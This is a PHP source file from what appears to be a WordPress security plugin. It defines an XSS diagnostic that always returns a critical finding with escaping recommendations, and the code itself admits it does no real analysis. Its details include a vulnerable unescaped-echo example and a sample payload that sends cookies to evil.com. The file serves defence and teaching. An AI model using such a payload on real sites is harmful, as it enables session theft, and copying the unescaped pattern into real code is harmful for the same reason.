<?php
/**
 * XSS Protection Diagnostic
 *
 * Issue #4884: User Input Not Escaped on Output (XSS Vulnerability)
 * Pillar: 🛡️ Safe by Default
 *
 * Checks if output is properly escaped to prevent XSS attacks.
 * Cross-Site Scripting lets attackers inject malicious JavaScript.
 *
 * @package    WPShadow
 * @subpackage Diagnostics
 * @since      1.6050.0000
 */

declare(strict_types=1);

namespace WPShadow\Diagnostics;

use WPShadow\Core\Diagnostic_Base;

if ( ! defined( 'ABSPATH' ) ) {
	exit;
}

/**
 * Diagnostic_XSS_Protection Class
 *
 * Checks for:
 * - All output escaped with esc_html(), esc_attr(), esc_url()
 * - No direct echo of user input
 * - JavaScript strings escaped with esc_js()
 * - HTML allowed only via wp_kses() with strict rules
 * - No innerHTML assignment without sanitization
 * - Content Security Policy headers
 * - X-XSS-Protection header enabled
 *
 * Why this matters:
 * - XSS is #3 OWASP vulnerability (A03:2021)
 * - Attackers steal sessions, cookies, credentials
 * - Attackers deface sites
 * - Attackers redirect to phishing sites
 * - One XSS hole compromises all users
 *
 * @since 1.6050.0000
 */
class Diagnostic_XSS_Protection extends Diagnostic_Base {

	/**
	 * The diagnostic slug
	 *
	 * @since 1.6050.0000
	 * @var   string
	 */
	protected static $slug = 'xss-protection';

	/**
	 * The diagnostic title
	 *
	 * @since 1.6050.0000
	 * @var   string
	 */
	protected static $title = 'User Input Not Escaped on Output (XSS Vulnerability)';

	/**
	 * The diagnostic description
	 *
	 * @since 1.6050.0000
	 * @var   string
	 */
	protected static $description = 'Checks if output is escaped to prevent Cross-Site Scripting (XSS) attacks';

	/**
	 * The family this diagnostic belongs to
	 *
	 * @since 1.6050.0000
	 * @var   string
	 */
	protected static $family = 'security';

	/**
	 * Run the diagnostic check.
	 *
	 * @since  1.6050.0000
	 * @return array|null Finding array if issue found, null otherwise.
	 */
	public static function check() {
		// This is a guidance diagnostic - actual XSS analysis requires code scanning.
		// We provide recommendations and patterns.

		$issues = array();

		$issues[] = __( 'ALWAYS escape output: echo esc_html( $variable )', 'wpshadow' );
		$issues[] = __( 'HTML attributes: use esc_attr() for attribute values', 'wpshadow' );
		$issues[] = __( 'URLs: use esc_url() for href/src attributes', 'wpshadow' );
		$issues[] = __( 'JavaScript: use esc_js() for JS strings', 'wpshadow' );
		$issues[] = __( 'Allow HTML only via wp_kses() with explicit tag whitelist', 'wpshadow' );
		$issues[] = __( 'NEVER use innerHTML without sanitization in JavaScript', 'wpshadow' );
		$issues[] = __( 'Set Content-Security-Policy header to restrict inline scripts', 'wpshadow' );

		if ( ! empty( $issues ) ) {
			return array(
				'id'           => self::$slug,
				'title'        => self::$title,
				'description'  => __( 'Cross-Site Scripting (XSS) lets attackers inject malicious JavaScript into pages. This steals user sessions, credentials, and compromises accounts.', 'wpshadow' ),
				'severity'     => 'critical',
				'threat_level' => 90,
				'auto_fixable' => false,  // Requires code audit
				'kb_link'      => 'https://wpshadow.com/kb/xss-protection',
				'details'      => array(
					'recommendations'         => $issues,
					'bad_example'             => 'echo "<div>" . $_POST["name"] . "</div>"; // XSS vulnerability',
					'good_example'            => 'echo "<div>" . esc_html( $_POST["name"] ) . "</div>";',
					'attack_example'          => 'attacker sends: <script>document.location="http://evil.com?cookie="+document.cookie</script>',
					'impact'                  => 'Session hijacking, credential theft, site defacement, phishing',
					'owasp_rank'              => 'A03:2021 Injection (#3 most critical)',
					'wordpress_functions'     => 'esc_html(), esc_attr(), esc_url(), esc_js(), wp_kses(), wp_kses_post()',
				),
			);
		}

		return null;
	}
}
